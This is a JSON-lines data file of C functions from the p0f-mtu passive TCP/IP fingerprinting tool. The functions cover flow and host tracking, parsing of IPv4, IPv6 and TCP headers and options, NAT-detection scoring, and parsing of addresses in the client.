{"docstring": "/* Destroy a flow. */\n", "func_signal": "static void destroy_flow(struct packet_flow* f)", "code": "{\n\n  CP(f);\n  CP(f->client);\n  CP(f->server);\n\n  DEBUG(\"[#] Destroying flow: %s/%u -> \",\n        addr_to_str(f->client->addr, f->client->ip_ver), f->cli_port);\n\n  DEBUG(\"%s/%u (bucket %u)\\n\",\n        addr_to_str(f->server->addr, f->server->ip_ver), f->srv_port,\n        f->bucket);\n\n  /* Remove it from the bucketed linked list. */\n\n  if (CP(f->next)) f->next->prev = f->prev;\n  \n  if (CP(f->prev)) f->prev->next = f->next;\n  else { CP(flow_b[f->bucket]); flow_b[f->bucket] = f->next; }\n\n  /* Remove from the by-age linked list. */\n\n  if (CP(f->newer)) f->newer->older = f->older;\n  else { CP(newest_flow); newest_flow = f->older; }\n\n  if (CP(f->older)) f->older->newer = f->newer;\n  else flow_by_age = f->newer; \n\n  /* Free memory, etc. */\n\n  f->client->use_cnt--;\n  f->server->use_cnt--;\n\n  free_sig_hdrs(&f->http_tmp);\n\n  ck_free(f->request);\n  ck_free(f->response);\n  ck_free(f);\n\n  flow_cnt--;  \n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Calculate hash bucket for packet_flow. Keep the hash symmetrical: switching\n   source and dest should have no effect. */\n", "func_signal": "static u32 get_flow_bucket(struct packet_data* pk)", "code": "{\n\n  u32 bucket;\n\n  if (pk->ip_ver == IP_VER4) {\n    bucket = hash32(pk->src, 4, hash_seed) ^ hash32(pk->dst, 4, hash_seed);\n  } else {\n    bucket = hash32(pk->src, 16, hash_seed) ^ hash32(pk->dst, 16, hash_seed);\n  }\n\n  bucket ^= hash32(&pk->sport, 2, hash_seed) ^ hash32(&pk->dport, 2, hash_seed);\n\n  return bucket % FLOW_BUCKETS;\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Find link-specific offset (pcap knows, but won't tell). */\n", "func_signal": "static void find_offset(const u8* data, s32 total_len)", "code": "{\n\n  u8 i;\n\n  /* Check hardcoded values for some of the most common options. */\n\n  switch (link_type) {\n\n    case DLT_RAW:        link_off = 0;  return;\n\n    case DLT_NULL:\n    case DLT_PPP:        link_off = 4;  return;\n\n    case DLT_LOOP:\n\n#ifdef DLT_PPP_SERIAL\n    case DLT_PPP_SERIAL:\n#endif /* DLT_PPP_SERIAL */\n\n    case DLT_PPP_ETHER:  link_off = 8;  return;\n\n    case DLT_EN10MB:     link_off = 14; return;\n\n#ifdef DLT_LINUX_SLL\n    case DLT_LINUX_SLL:  link_off = 16; return;\n#endif /* DLT_LINUX_SLL */\n\n    case DLT_PFLOG:      link_off = 28; return;\n\n    case DLT_IEEE802_11: link_off = 32; return;\n  }\n\n  /* If this fails, try to auto-detect. There is a slight risk that if the\n     first packet we see is maliciously crafted, and somehow gets past the\n     configured BPF filter, we will configure the wrong offset. But that\n     seems fairly unlikely. */\n\n  for (i = 0; i < 40; i += 2, total_len -= 2) {\n\n    if (total_len < MIN_TCP4) break;\n\n    /* Perhaps this is IPv6? We check three things: IP version (first 4 bits);\n       total length sufficient to accommodate IPv6 and TCP headers; and the\n       \"next protocol\" field equal to PROTO_TCP. */\n\n    if (total_len >= MIN_TCP6 && (data[i] >> 4) == IP_VER6) {\n\n      struct ipv6_hdr* hdr = (struct ipv6_hdr*)(data + i);\n\n      if (hdr->proto == PROTO_TCP) {\n\n        DEBUG(\"[#] Detected packet offset of %u via IPv6 (link type %u).\\n\", i,\n              link_type);\n        link_off = i;\n        break;\n\n      }\n      \n    }\n\n    /* Okay, let's try IPv4 then. The same approach, except the shortest packet\n       size must be just enough to accommodate IPv4 + TCP (already checked). */\n\n    if ((data[i] >> 4) == IP_VER4) {\n\n      struct ipv4_hdr* hdr = (struct ipv4_hdr*)(data + i);\n\n      if (hdr->proto == PROTO_TCP) {\n\n        DEBUG(\"[#] Detected packet offset of %u via IPv4 (link type %u).\\n\", i,\n              link_type);\n        link_off = i;\n        break;\n\n      }\n\n    }\n\n  }\n\n  /* If we found something, adjust for VLAN tags (ETH_P_8021Q == 0x8100). Else,\n     complain once and try again soon. */\n\n  if (link_off >= 4 && data[i-4] == 0x81 && data[i-3] == 0x00) {\n\n    DEBUG(\"[#] Adjusting offset due to VLAN tagging.\\n\");\n    link_off -= 4;\n\n  } else if (link_off == -1) {\n\n    link_off = -2;\n    WARN(\"Unable to find link-specific packet offset. This is bad.\");\n\n  }\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Look up host data. */\n", "func_signal": "struct host_data* lookup_host(u8* addr, u8 ip_ver)", "code": "{\n\n  u32 bucket = get_host_bucket(addr, ip_ver);\n  struct host_data* h = host_b[bucket];\n\n  while (CP(h)) {\n\n    if (ip_ver == h->ip_ver &&\n        !memcmp(addr, h->addr, (h->ip_ver == IP_VER4) ? 4 : 16))\n      return h;\n\n    h = h->next;\n\n  }\n\n  return NULL;\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Add NAT score, check if alarm due. */\n", "func_signal": "void add_nat_score(u8 to_srv, struct packet_flow* f, u16 reason, u8 score)", "code": "{\n\n  static u8 rea[1024];\n\n  struct host_data* hd;\n  u8 *scores, *rptr = rea;\n  u32 i;\n  u8  over_5 = 0, over_2 = 0, over_1 = 0, over_0 = 0;\n\n  if (to_srv) {\n\n    hd = f->client;\n    scores = hd->cli_scores;\n\n  } else {\n\n    hd = f->server;\n    scores = hd->srv_scores;\n\n  }\n\n  memmove(scores, scores + 1, NAT_SCORES - 1);\n  scores[NAT_SCORES - 1] = score;\n  hd->nat_reasons |= reason;\n\n  if (!score) return;\n\n  for (i = 0; i < NAT_SCORES; i++) switch (scores[i]) {\n    case 6 ... 255: over_5++;\n    case 3 ... 5:   over_2++;\n    case 2:         over_1++;\n    case 1:         over_0++;\n  }\n\n  if (over_5 > 2 || over_2 > 4 || over_1 > 6 || over_0 > 8) {\n\n    start_observation(\"ip sharing\", 2, to_srv, f);\n\n    reason = hd->nat_reasons;\n\n    hd->last_nat = get_unix_time();\n\n    memset(scores, 0, NAT_SCORES);\n    hd->nat_reasons = 0;\n\n  } else {\n\n    /* Wait for something more substantial. */\n    if (score == 1) return;\n\n    start_observation(\"host change\", 2, to_srv, f);\n\n    hd->last_chg = get_unix_time();\n\n  }\n\n  *rptr = 0;\n\n#define REAF(_par...) do { \\\n    rptr += sprintf((char*)rptr, _par); \\\n  } while (0) \n\n  if (reason & NAT_APP_SIG)  REAF(\" app_vs_os\");\n  if (reason & NAT_OS_SIG)   REAF(\" os_diff\");\n  if (reason & NAT_UNK_DIFF) REAF(\" sig_diff\");\n  if (reason & NAT_TO_UNK)   REAF(\" x_known\");\n  if (reason & NAT_TS)       REAF(\" tstamp\");\n  if (reason & NAT_TTL)      REAF(\" ttl\");\n  if (reason & NAT_PORT)     REAF(\" port\");\n  if (reason & NAT_MSS)      REAF(\" mtu\");\n  if (reason & NAT_FUZZY)    REAF(\" fuzzy\");\n\n  if (reason & NAT_APP_VIA)  REAF(\" via\");\n  if (reason & NAT_APP_DATE) REAF(\" date\");\n  if (reason & NAT_APP_LB)   REAF(\" srv_sig_lb\");\n  if (reason & NAT_APP_UA)   REAF(\" ua_vs_os\");\n\n#undef REAF\n\n  add_observation_field(\"reason\", rea[0] ? (rea + 1) : NULL);\n\n  OBSERVF(\"raw_hits\", \"%u,%u,%u,%u\", over_5, over_2, over_1, over_0);\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Verify if tool class (called from modules). */\n", "func_signal": "void verify_tool_class(u8 to_srv, struct packet_flow* f, u32* sys, u32 sys_cnt)", "code": "{\n\n  struct host_data* hd;\n  u32 i;\n\n  if (to_srv) hd = f->client; else hd = f->server;\n\n  CP(sys);\n\n  /* No existing data; although there is perhaps some value in detecting\n     app-only conflicts in absence of other info, it's probably OK to just\n     wait until more data becomes available. */\n\n  if (hd->last_class_id == -1) return;\n\n  for (i = 0; i < sys_cnt; i++)\n\n    if ((sys[i] & SYS_CLASS_FLAG)) {\n\n      if (SYS_NF(sys[i]) == hd->last_class_id) break;\n\n    } else {\n\n      if (SYS_NF(sys[i]) == hd->last_name_id) break;\n\n    }\n\n  /* Oops, a mismatch. */\n\n  if (i == sys_cnt) {\n\n    DEBUG(\"[#] Detected app not supposed to run on host OS.\\n\");\n    add_nat_score(to_srv, f, NAT_APP_SIG, 4);\n\n  } else {\n\n    DEBUG(\"[#] Detected app supported on host OS.\\n\");\n    add_nat_score(to_srv, f, 0, 0);\n\n  }\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Parse IPv4 address into a buffer. */\n", "func_signal": "static void parse_addr4(char* str, u8* ret)", "code": "{\n\n  u32 a1, a2, a3, a4;\n\n  if (sscanf(str, \"%u.%u.%u.%u\", &a1, &a2, &a3, &a4) != 4)\n    FATAL(\"Malformed IPv4 address.\");\n\n  if (a1 > 255 || a2 > 255 || a3 > 255 || a4 > 255)\n    FATAL(\"Malformed IPv4 address.\");\n\n  ret[0] = a1;\n  ret[1] = a2;\n  ret[2] = a3;\n  ret[3] = a4;\n\n}", "path": "tools\\p0f-client.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Indiscriminately kill some of the older hosts. */\n", "func_signal": "static void nuke_hosts(void)", "code": "{\n\n  u32 kcnt = 1 + (host_cnt * KILL_PERCENT / 100);\n  struct host_data* target = host_by_age;\n\n  if (!read_file)\n    WARN(\"Too many host entries, deleting %u. Use -m to adjust.\", kcnt);\n\n  nuke_flows(1);\n\n  while (kcnt && CP(target)) {\n    struct host_data* next = target->older;\n    if (!target->use_cnt) { kcnt--; destroy_host(target); }\n    target = next;\n  }\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Create flow, and host data if necessary. If counts exceeded, prune old. */\n", "func_signal": "static struct packet_flow* create_flow_from_syn(struct packet_data* pk)", "code": "{\n\n  u32 bucket = get_flow_bucket(pk);\n  struct packet_flow* nf;\n\n  if (flow_cnt > max_conn) nuke_flows(0);\n\n  DEBUG(\"[#] Creating flow from SYN: %s/%u -> \",\n        addr_to_str(pk->src, pk->ip_ver), pk->sport);\n\n  DEBUG(\"%s/%u (bucket %u)\\n\",\n        addr_to_str(pk->dst, pk->ip_ver), pk->dport, bucket);\n\n  nf = ck_alloc(sizeof(struct packet_flow));\n\n  nf->client = lookup_host(pk->src, pk->ip_ver);\n\n  if (nf->client) touch_host(nf->client);\n  else nf->client = create_host(pk->src, pk->ip_ver);\n\n  nf->server = lookup_host(pk->dst, pk->ip_ver);\n\n  if (nf->server) touch_host(nf->server);\n  else nf->server = create_host(pk->dst, pk->ip_ver);\n\n  nf->client->use_cnt++;\n  nf->server->use_cnt++;\n\n  nf->client->total_conn++;\n  nf->server->total_conn++;\n\n  /* Insert into the bucketed linked list.*/\n\n  if (CP(flow_b[bucket])) {\n    flow_b[bucket]->prev = nf;\n    nf->next = flow_b[bucket];\n  }\n\n  flow_b[bucket] = nf;\n\n  /* Insert into the by-age linked list */\n \n  if (CP(newest_flow)) {\n    newest_flow->newer = nf;\n    nf->older = newest_flow;\n  } else flow_by_age = nf;\n\n  newest_flow = nf;\n\n  /* Populate other data */\n\n  nf->cli_port = pk->sport;\n  nf->srv_port = pk->dport;\n  nf->bucket   = bucket;\n  nf->created  = get_unix_time();\n\n  nf->next_cli_seq = pk->seq + 1;\n\n  flow_cnt++;\n  return nf;\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Destroy host data. */\n", "func_signal": "static void destroy_host(struct host_data* h)", "code": "{\n\n  u32 bucket; \n\n  bucket = get_host_bucket(CP(h)->addr, h->ip_ver);\n\n  if (h->use_cnt) FATAL(\"Attempt to destroy used host data.\");\n\n  DEBUG(\"[#] Destroying host data: %s (bucket %d)\\n\",\n        addr_to_str(h->addr, h->ip_ver), bucket);\n\n  /* Remove it from the bucketed linked list. */\n\n  if (CP(h->next)) h->next->prev = h->prev;\n  \n  if (CP(h->prev)) h->prev->next = h->next;\n  else host_b[bucket] = h->next;\n\n  /* Remove from the by-age linked list. */\n\n  if (CP(h->newer)) h->newer->older = h->older;\n  else newest_host = h->older;\n\n  if (CP(h->older)) h->older->newer = h->newer;\n  else host_by_age = h->newer; \n\n  /* Free memory. */\n\n  ck_free(h->last_syn);\n  ck_free(h->last_synack);\n\n  ck_free(h->http_resp);\n  ck_free(h->http_req_os);\n\n  ck_free(h);\n\n  host_cnt--;\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Touch host data to make it more recent. */\n", "func_signal": "static void touch_host(struct host_data* h)", "code": "{\n\n  CP(h);\n\n  DEBUG(\"[#] Refreshing host data: %s\\n\", addr_to_str(h->addr, h->ip_ver));\n\n  if (h != CP(newest_host)) {\n\n    /* Remove from the the by-age linked list. */\n\n    CP(h->newer);\n    h->newer->older = h->older;\n\n    if (CP(h->older)) h->older->newer = h->newer;\n    else host_by_age = h->newer; \n\n    /* Re-insert in front. */\n\n    newest_host->newer = h;\n    h->older = newest_host;\n    h->newer = NULL;\n\n    newest_host = h;\n\n    /* This wasn't the only entry on the list, so there is no\n       need to update the tail (host_by_age). */\n\n  }\n\n  /* Update last seen time. */\n\n  h->last_seen = get_unix_time();\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Parse IPv6 address into a buffer. */\n", "func_signal": "static void parse_addr6(char* str, u8* ret)", "code": "{\n\n  u32 seg = 0;\n  u32 val;\n\n  while (*str) {\n\n    if (seg == 8) FATAL(\"Malformed IPv6 address (too many segments).\");\n\n    if (sscanf((char*)str, \"%x\", &val) != 1 ||\n        val > 65535) FATAL(\"Malformed IPv6 address (bad octet value).\");\n\n    ret[seg * 2] = val >> 8;\n    ret[seg * 2 + 1] = val;\n\n    seg++;\n\n    while (isxdigit(*str)) str++;\n    if (*str) str++;\n\n  }\n\n  if (seg != 8) FATAL(\"Malformed IPv6 address (don't abbreviate).\");\n\n}", "path": "tools\\p0f-client.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Parse PCAP input, with plenty of sanity checking. Store interesting details\n   in a protocol-agnostic buffer that will be then examined upstream. */\n", "func_signal": "void parse_packet(void* junk, const struct pcap_pkthdr* hdr, const u8* data)", "code": "{\n\n  struct tcp_hdr* tcp;\n  struct packet_data pk;\n\n  s32 packet_len;\n  u32 tcp_doff;\n\n  u8* opt_end;\n\n  packet_cnt++;\n  \n  cur_time = (struct timeval*)&hdr->ts;\n\n  if (!(packet_cnt % EXPIRE_INTERVAL)) expire_cache();\n\n  /* Be paranoid about how much data we actually have off the wire. */\n\n  packet_len = MIN(hdr->len, hdr->caplen);\n  if (packet_len > SNAPLEN) packet_len = SNAPLEN;\n\n  // DEBUG(\"[#] Received packet: len = %d, caplen = %d, limit = %d\\n\",\n  //    hdr->len, hdr->caplen, SNAPLEN);\n\n  /* Account for link-level headers. */\n\n  if (link_off < 0) find_offset(data, packet_len);\n\n  if (link_off > 0) {\n\n    data += link_off;\n    packet_len -= link_off;\n\n  }\n\n  /* If there is no way we could have received a complete TCP packet, bail\n     out early. */\n\n  if (packet_len < MIN_TCP4) {\n    DEBUG(\"[#] Packet too short for any IPv4 + TCP headers, giving up!\\n\");\n    return;\n  }\n\n  pk.quirks = 0;\n\n  if ((*data >> 4) == IP_VER4) {\n\n    /************************\n     * IPv4 header parsing. *\n     ************************/\n    \n    const struct ipv4_hdr* ip4 = (struct ipv4_hdr*)data;\n\n    u32 hdr_len = (ip4->ver_hlen & 0x0F) * 4;\n    u16 flags_off = ntohs(RD16(ip4->flags_off));\n    u16 tot_len = ntohs(RD16(ip4->tot_len));\n\n    /* If the packet claims to be shorter than what we received off the wire,\n       honor this claim to account for etherleak-type bugs. */\n\n    if (packet_len > tot_len) {\n      packet_len = tot_len;\n      // DEBUG(\"[#] ipv4.tot_len = %u, adjusted accordingly.\\n\", tot_len);\n    }\n\n    /* Bail out if the result leaves no room for IPv4 + TCP headers. */\n\n    if (packet_len < MIN_TCP4) {\n      DEBUG(\"[#] packet_len = %u. Too short for IPv4 + TCP, giving up!\\n\",\n            packet_len);\n      return;\n    }\n\n    /* Bail out if the declared length of IPv4 headers is nonsensical. */\n\n    if (hdr_len < sizeof(struct ipv4_hdr)) {\n      DEBUG(\"[#] ipv4.hdr_len = %u. Too short for IPv4, giving up!\\n\",\n            hdr_len);\n      return;\n    }\n\n    /* If the packet claims to be longer than the recv buffer, best to back\n       off - even though we could just ignore this and recover. */\n\n    if (tot_len > packet_len) {\n      DEBUG(\"[#] ipv4.tot_len = %u but packet_len = %u, bailing out!\\n\",\n            tot_len, packet_len);\n      return;\n    }\n\n    /* And finally, bail out if after skipping the IPv4 header as specified\n       (including options), there wouldn't be enough room for TCP. */\n\n    if (hdr_len + sizeof(struct tcp_hdr) > packet_len) {\n      DEBUG(\"[#] ipv4.hdr_len = %u, packet_len = %d, no room for TCP!\\n\",\n            hdr_len, packet_len);\n      return;\n    }\n\n    /* Bail out if the subsequent protocol is not TCP. */\n\n    if (ip4->proto != PROTO_TCP) {\n      DEBUG(\"[#] Whoa, IPv4 packet with non-TCP payload (%u)?\\n\", ip4->proto);\n      return;\n    }\n\n    /* Ignore any traffic with MF or non-zero fragment offset specified. We\n       can do enough just fingerprinting the non-fragmented traffic. */\n\n    if (flags_off & ~(IP4_DF | IP4_MBZ)) {\n      DEBUG(\"[#] Packet fragment (0x%04x), letting it slide!\\n\", flags_off);\n      return;\n    }\n\n    /* Store some relevant information about the packet. */\n\n    pk.ip_ver = IP_VER4;\n\n    pk.ip_opt_len = hdr_len - 20;\n\n    memcpy(pk.src, ip4->src, 4);\n    memcpy(pk.dst, ip4->dst, 4);\n\n    pk.tos = ip4->tos_ecn >> 2;\n\n    pk.ttl = ip4->ttl;\n\n    if (ip4->tos_ecn & (IP_TOS_CE | IP_TOS_ECT)) pk.quirks |= QUIRK_ECN;\n\n    /* Tag some of the corner cases associated with implementation quirks. */\n    \n    if (flags_off & IP4_MBZ) pk.quirks |= QUIRK_NZ_MBZ;\n\n    if (flags_off & IP4_DF) {\n\n      pk.quirks |= QUIRK_DF;\n      if (RD16(ip4->id)) pk.quirks |= QUIRK_NZ_ID;\n\n    } else {\n\n      if (!RD16(ip4->id)) pk.quirks |= QUIRK_ZERO_ID;\n\n    }\n\n    pk.tot_hdr = hdr_len;\n\n    tcp = (struct tcp_hdr*)(data + hdr_len);\n    packet_len -= hdr_len;\n    \n  } else if ((*data >> 4) == IP_VER6) {\n\n    /************************\n     * IPv6 header parsing. *\n     ************************/\n    \n    const struct ipv6_hdr* ip6 = (struct ipv6_hdr*)data;\n    u32 ver_tos = ntohl(RD32(ip6->ver_tos));\n    u32 tot_len = ntohs(RD16(ip6->pay_len)) + sizeof(struct ipv6_hdr);\n\n    /* If the packet claims to be shorter than what we received off the wire,\n       honor this claim to account for etherleak-type bugs. */\n\n    if (packet_len > tot_len) {\n      packet_len = tot_len;\n      // DEBUG(\"[#] ipv6.tot_len = %u, adjusted accordingly.\\n\", tot_len);\n    }\n\n    /* Bail out if the result leaves no room for IPv6 + TCP headers. */\n\n    if (packet_len < MIN_TCP6) {\n      DEBUG(\"[#] packet_len = %u. Too short for IPv6 + TCP, giving up!\\n\",\n            packet_len);\n      return;\n    }\n\n    /* If the packet claims to be longer than the data we have, best to back\n       off - even though we could just ignore this and recover. */\n\n    if (tot_len > packet_len) {\n      DEBUG(\"[#] ipv6.tot_len = %u but packet_len = %u, bailing out!\\n\",\n            tot_len, packet_len);\n      return;\n    }\n\n    /* Bail out if the subsequent protocol is not TCP. One day, we may try\n       to parse and skip IPv6 extensions, but there seems to be no point in\n       it today. */\n\n    if (ip6->proto != PROTO_TCP) {\n      DEBUG(\"[#] IPv6 packet with non-TCP payload (%u).\\n\", ip6->proto);\n      return;\n    }\n\n    /* Store some relevant information about the packet. */\n\n    pk.ip_ver = IP_VER6;\n\n    pk.ip_opt_len = 0;\n\n    memcpy(pk.src, ip6->src, 16);\n    memcpy(pk.dst, ip6->dst, 16);\n\n    pk.tos = (ver_tos >> 22) & 0x3F;\n\n    pk.ttl = ip6->ttl;\n\n    if (ver_tos & 0xFFFFF) pk.quirks |= QUIRK_FLOW;\n\n    if ((ver_tos >> 20) & (IP_TOS_CE | IP_TOS_ECT)) pk.quirks |= QUIRK_ECN;\n\n    pk.tot_hdr = sizeof(struct ipv6_hdr);\n\n    tcp = (struct tcp_hdr*)(ip6 + 1);\n    packet_len -= sizeof(struct ipv6_hdr);\n\n  } else {\n\n    if (!bad_packets) {\n      WARN(\"Unknown packet type %u, link detection issue?\", *data >> 4);\n      bad_packets = 1;\n    }\n\n    return;\n\n  }\n\n  /***************\n   * TCP parsing *\n   ***************/\n\n  data = (u8*)tcp;\n\n  tcp_doff = (tcp->doff_rsvd >> 4) * 4;\n\n  /* As usual, let's start with sanity checks. */\n\n  if (tcp_doff < sizeof(struct tcp_hdr)) {\n    DEBUG(\"[#] tcp.hdr_len = %u, not enough for TCP!\\n\", tcp_doff);\n    return;\n  }\n\n  if (tcp_doff > packet_len) {\n    DEBUG(\"[#] tcp.hdr_len = %u, past end of packet!\\n\", tcp_doff);\n    return;\n  }\n\n  pk.tot_hdr += tcp_doff;\n\n  pk.sport = ntohs(RD16(tcp->sport));\n  pk.dport = ntohs(RD16(tcp->dport));\n\n  pk.tcp_type = tcp->flags & (TCP_SYN | TCP_ACK | TCP_FIN | TCP_RST);\n\n  /* NUL, SYN+FIN, SYN+RST, FIN+RST, etc, should go to /dev/null. */\n\n  if (((tcp->flags & TCP_SYN) && (tcp->flags & (TCP_FIN | TCP_RST))) ||\n      ((tcp->flags & TCP_FIN) && (tcp->flags & TCP_RST)) ||\n      !pk.tcp_type) {\n\n    DEBUG(\"[#] Silly combination of TCP flags: 0x%02x.\\n\", tcp->flags);\n    return;\n\n  }\n\n  pk.win = ntohs(RD16(tcp->win));\n\n  pk.seq = ntohl(RD32(tcp->seq));\n\n  /* Take note of miscellanous features and quirks. */\n\n  if ((tcp->flags & (TCP_ECE | TCP_CWR)) || \n      (tcp->doff_rsvd & TCP_NS_RES)) pk.quirks |= QUIRK_ECN;\n\n  if (!pk.seq) pk.quirks |= QUIRK_ZERO_SEQ;\n\n  if (tcp->flags & TCP_ACK) {\n\n    if (!RD32(tcp->ack)) pk.quirks |= QUIRK_ZERO_ACK;\n\n  } else {\n\n    /* A good proportion of RSTs tend to have \"illegal\" ACK numbers, so\n       ignore these. */\n\n    if (RD32(tcp->ack) & !(tcp->flags & TCP_RST)) {\n\n      DEBUG(\"[#] Non-zero ACK on a non-ACK packet: 0x%08x.\\n\",\n            ntohl(RD32(tcp->ack)));\n\n      pk.quirks |= QUIRK_NZ_ACK;\n\n    }\n\n  }\n\n  if (tcp->flags & TCP_URG) {\n\n    pk.quirks |= QUIRK_URG;\n\n  } else {\n\n    if (RD16(tcp->urg)) {\n\n      DEBUG(\"[#] Non-zero UPtr on a non-URG packet: 0x%08x.\\n\",\n            ntohl(RD16(tcp->urg)));\n\n      pk.quirks |= QUIRK_NZ_URG;\n\n    }\n\n  }\n\n  if (tcp->flags & TCP_PUSH) pk.quirks |= QUIRK_PUSH;\n\n  /* Handle payload data. */\n\n  if (tcp_doff == packet_len) {\n\n    pk.payload = NULL;\n    pk.pay_len = 0;\n\n  } else {\n\n    pk.payload = (u8*)data + tcp_doff;\n    pk.pay_len = packet_len - tcp_doff;\n\n  }\n\n  /**********************\n   * TCP option parsing *\n   **********************/\n\n  opt_end = (u8*)data + tcp_doff; /* First byte of non-option data */\n  data = (u8*)(tcp + 1);\n\n  pk.opt_cnt     = 0;\n  pk.opt_eol_pad = 0;\n  pk.mss         = 0;\n  pk.wscale      = 0;\n  pk.ts1         = 0;\n\n  /* Option parsing problems are non-fatal, but we want to keep track of\n     them to spot buggy TCP stacks. */\n\n  while (data < opt_end && pk.opt_cnt < MAX_TCP_OPT) {\n\n    pk.opt_layout[pk.opt_cnt++] = *data;\n\n    switch (*data++) {\n\n      case TCPOPT_EOL:\n\n        /* EOL is a single-byte option that aborts further option parsing.\n           Take note of how many bytes of option data are left, and if any of\n           them are non-zero. */\n\n        pk.opt_eol_pad = opt_end - data;\n        \n        while (data < opt_end && !*data++);\n\n        if (data != opt_end) {\n          pk.quirks |= QUIRK_OPT_EOL_NZ;\n          data = opt_end;\n        }\n\n        break;\n\n      case TCPOPT_NOP:\n\n        /* NOP is a single-byte option that does nothing. */\n\n        break;\n  \n      case TCPOPT_MAXSEG:\n\n        /* MSS is a four-byte option with specified size. */\n\n        if (data + 3 > opt_end) {\n          DEBUG(\"[#] MSS option would end past end of header (%u left).\\n\",\n                opt_end - data);\n          goto abort_options;\n        }\n\n        if (*data != 4) {\n          DEBUG(\"[#] MSS option expected to have 4 bytes, not %u.\\n\", *data);\n          pk.quirks |= QUIRK_OPT_BAD;\n        }\n\n        pk.mss = ntohs(RD16p(data+1));\n\n        data += 3;\n\n        break;\n\n      case TCPOPT_WSCALE:\n\n        /* WS is a three-byte option with specified size. */\n\n        if (data + 2 > opt_end) {\n          DEBUG(\"[#] WS option would end past end of header (%u left).\\n\",\n                opt_end - data);\n          goto abort_options;\n        }\n\n        if (*data != 3) {\n          DEBUG(\"[#] WS option expected to have 3 bytes, not %u.\\n\", *data);\n          pk.quirks |= QUIRK_OPT_BAD;\n        }\n\n        pk.wscale = data[1];\n\n        if (pk.wscale > 14) pk.quirks |= QUIRK_OPT_EXWS;\n\n        data += 2;\n\n        break;\n\n      case TCPOPT_SACKOK:\n\n        /* SACKOK is a two-byte option with specified size. */\n\n        if (data + 1 > opt_end) {\n          DEBUG(\"[#] SACKOK option would end past end of header (%u left).\\n\",\n                opt_end - data);\n          goto abort_options;\n        }\n\n        if (*data != 2) {\n          DEBUG(\"[#] SACKOK option expected to have 2 bytes, not %u.\\n\", *data);\n          pk.quirks |= QUIRK_OPT_BAD;\n        }\n\n        data++;\n\n        break;\n\n      case TCPOPT_SACK:\n\n        /* SACK is a variable-length option of 10 to 34 bytes. Because we don't\n           know the size any better, we need to bail out if it looks wonky. */\n\n        if (data == opt_end) {\n          DEBUG(\"[#] SACK option without room for length field.\");\n          goto abort_options;\n        }\n\n        if (*data < 10 || *data > 34) {\n          DEBUG(\"[#] SACK length out of range (%u), bailing out.\\n\", *data);\n          goto abort_options;\n        }\n\n        if (data - 1 + *data > opt_end) {\n          DEBUG(\"[#] SACK option (len %u) is too long (%u left).\\n\",\n                *data, opt_end - data);\n          goto abort_options;\n        }\n\n        data += *data - 1;\n\n        break;\n\n      case TCPOPT_TSTAMP:\n\n        /* Timestamp is a ten-byte option with specified size. */\n\n        if (data + 9 > opt_end) {\n          DEBUG(\"[#] TStamp option would end past end of header (%u left).\\n\",\n                opt_end - data);\n          goto abort_options;\n        }\n\n        if (*data != 10) {\n          DEBUG(\"[#] TStamp option expected to have 10 bytes, not %u.\\n\",\n                *data);\n          pk.quirks |= QUIRK_OPT_BAD;\n        }\n\n        pk.ts1 = ntohl(RD32p(data + 1));\n\n        if (!pk.ts1) pk.quirks |= QUIRK_OPT_ZERO_TS1;\n\n        if (pk.tcp_type == TCP_SYN && RD32p(data + 5)) {\n\n          DEBUG(\"[#] Non-zero second timestamp: 0x%08x.\\n\",\n                ntohl(*(u32*)(data + 5)));\n\n          pk.quirks |= QUIRK_OPT_NZ_TS2;\n\n        }\n\n        data += 9;\n\n        break;\n\n      default:\n\n        /* Unknown option, presumably with specified size. */\n\n        if (data == opt_end) {\n          DEBUG(\"[#] Unknown option 0x%02x without room for length field.\",\n                data[-1]);\n          goto abort_options;\n        }\n\n        if (*data < 2 || *data > 40) {\n          DEBUG(\"[#] Unknown option 0x%02x has invalid length %u.\\n\",\n                data[-1], *data);\n          goto abort_options;\n        }\n\n        if (data - 1 + *data > opt_end) {\n          DEBUG(\"[#] Unknown option 0x%02x (len %u) is too long (%u left).\\n\",\n                data[-1], *data, opt_end - data);\n          goto abort_options;\n        }\n\n        data += *data - 1;\n\n    }\n\n  }\n\n  if (data != opt_end) {\n\nabort_options:\n\n    DEBUG(\"[#] Option parsing aborted (cnt = %u, remainder = %u).\\n\",\n          pk.opt_cnt, opt_end - data);\n\n    pk.quirks |= QUIRK_OPT_BAD;\n\n  }\n\n  flow_dispatch(&pk);\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
